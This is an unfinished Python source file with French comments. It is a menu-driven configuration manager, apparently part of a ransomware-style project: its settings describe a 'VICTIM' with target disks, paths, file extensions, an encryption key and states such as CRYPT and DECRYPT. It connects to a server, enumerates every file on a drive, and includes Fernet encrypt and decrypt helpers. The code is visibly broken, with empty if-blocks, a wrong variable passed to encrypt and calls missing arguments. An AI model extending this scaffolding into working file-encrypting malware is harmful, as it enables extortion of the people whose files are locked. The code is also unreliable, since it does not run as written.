from utile import network as net
from utile import message as mess
import json
import glob
import sys
import configparser
from cryptography.fernet import Fernet


# Connexion au serveur
serv, gp = net.connect_to_serv()
#----------------------------------------------------------
def lister_chemins_fichiers(disque):

    disk = str(disque)
    path_files = glob.glob(f'{disque}:/**/*', recursive = True)

    return path_files

def lire_fichier(path_file):

    file = open(path_file, "r")
    content = file.read()
    file.close()

    return content



def choix_action():
    """
    Cette fonction, lorsqu'elle est appelée, affiche un menu et demande à l'utilisateur d'entrer le choix
    correspondant. Elle retourne un entier entre 1 et 7 qui est le choix de la personne.
    :return: int, le numéro du choix de l'utilisateur
    """

    menu = "\nGESTION DES CONFIGURATIONS\n" \
           "==========================\n" \
           "1) Charger une configuration\n" \
           "2) Afficher la configuration courante\n" \
           "3) Modifier ou ajouter un paramètre à la configuration courante\n" \
           "4) Supprime un paramètre de la configuration courante\n" \
           "5) Créer une nouvelle configuration courante\n"\
           "6) Sauvegarder la configuration courante\n" \
           "7) Quitter\n" \
           "Votre choix (de 1 à 7): "

    choix = int(input(menu))

    # Vérifie que le choix entré est bien entre 1 et 7
    while choix > 7 or choix < 1:
        print("-----------------------------------------")
        print("Veuillez entrer un chiffre entre 1 et 7!")
        print("-----------------------------------------")
        choix = int(input(menu))

    return int(choix)



def print_config(num_config):
    """
    Cette fonction sert à afficher dans la console la configuration que l'utilisateur à demandé au moyen du paramètre num_config.
    :param num_config:
    """

def set_config(name,action,param,value):
    """
    Cette fonction sert, selon les choix de l'utilisateur, à supprimer un paramètre d'une configuraiton, modifier une valeur déjà présente,
    ou ajouter une valeur.
    :param action: l'action de l'utilisateur veut faire sur le paramètre: supprimer, ajouter ou modifier)
    :param param: le paramètre que l'utilisateur veut supprimer/modifier/ajouter
    :param value: si l'utilisateur veut ajouter ou modifier, la valeur par laquelle le paramètre va être changé
    """

    if action == 1: #Si action est a 1, on ajoute dans le fichier
        load_config(name)



def load_config(name):
    """
    Cette fonction charge une configuration
    :param name: str, le nom du fichier de configuration qu'il faudra ouvrir
    :return: dict, contient le contenu du fichier de configuration sous forme de dictionnaire
    """

    # Ouvre le fichier cfg correspondant, lis son contenu et le stocke
    file = open(f"{name}.cfg", "r")
    content_config = file.read()
    # Transforme le contenu (au format json) en dictionnaire
    content_config = json.loads(content_config)
    file.close()

    # Ouvre le fichier key correspondant, lis son contenu et le stocke
    file = open(f"{name}.key", "rb")
    key_config = file.read()
    file.close()

    # Decrypte le contenu qui a été récupéré du fichier cfg avec la clé qui a été récupérée du fichier key
    content_decrypted = decrypt(content_config,key_config)

    return content_decrypted

def create_config(name="config"):
    """
    Cette fonction créée un fichier de configuration et un fichier qui stockera la clé (fichiers vides)
    :param type_system
    """

    #Si la suite, ajouter un paramètre type_system à la fonction
    #config = configparser.ConfigParser()
    # if type_system == 'WORKSTATION':
    #     config['VICTIM'] = {'DISKS' : [],
    #                         'PATHS' : [],
    #                         'FILE_EXT': [],
    #                         'FREQ' : '120',
    #                         'KEY' : None,
    #                         'STATE' : 'INITIALIZE'
    #                         }
    # elif type_system == 'SERVER':
    #     config['VICTIM'] = {'DISKS': [],
    #                         'PATHS': [],
    #                         'FILE_EXT': [],
    #                         'FREQ': '60',
    #                         'KEY': None,
    #                         'STATE': 'INITIALIZE'
    #                         }

    open(f"{name}.cfg", "w")
    open(f"{name}.key", "w")


def encrypt(content,key):
    encoded_content = content.encode()
    f = Fernet(key)
    encrypted_content = f.encrypt(content)

    return encrypted_content

def decrypt(content,key):
    f = Fernet(key)
    decrypted_message_json = f.decrypt(content)
    decrypted_message = json.loads(decrypted_message_json)

    return decrypted_message

def generate_key(name):
    key = Fernet.generate_key()
    with open(f"{name}.key", "wb") as key_file:
        key_file.write(key)

'''def creation_fichier_json():

    setting = {'DISKS': [], # doit être une liste de string contenant les disques
               'PATHS': [], # doit être une liste de string contenant les chemins vers les fichiers des disques
               'FILE_EXT': [], # doit être une liste de string contenant les différentes extensions des fichiers des disques
               'FREQ': 0, # doit être un int, est la fréquence d'émission en seconde
               'KEY': '', # doit être une string contenant 512 caractères imprimables pour la clé de chiffrement
               'STATE': '' # doit être une string contenant les états "INITIALIZE", "CRYPT", "PENDING", "DECRYPT" ou "PROTECTED"
               }

    with open("../configure/config/setting.json","w") as f:
        json.dump(setting, f)'''
#----------------------------------------------------------

# Affiche une première fois le menu et stocke le choix
num_choix = choix_action()

# Boucle tant que l'utilisateur ne choisi pas le quatrième choix (quitter)
while num_choix != 7:

    if num_choix == 1:
        load_config()

    if num_choix == 2:

    if num_choix == 3:

    if num_choix == 4:

    if num_choix == 5:
        create_config()
        print("\nLa configuration courante est réinitialisée")

    if num_choix == 6:

    # Redemande l'action pour savoir si on doit quitter la boucle et quitter ou s'il faut faire autre chose
    num_choix = choix_action()

# Ferme la fenêtre lorsque le choix est 4
print("\nFermeture de la session.")
exit()
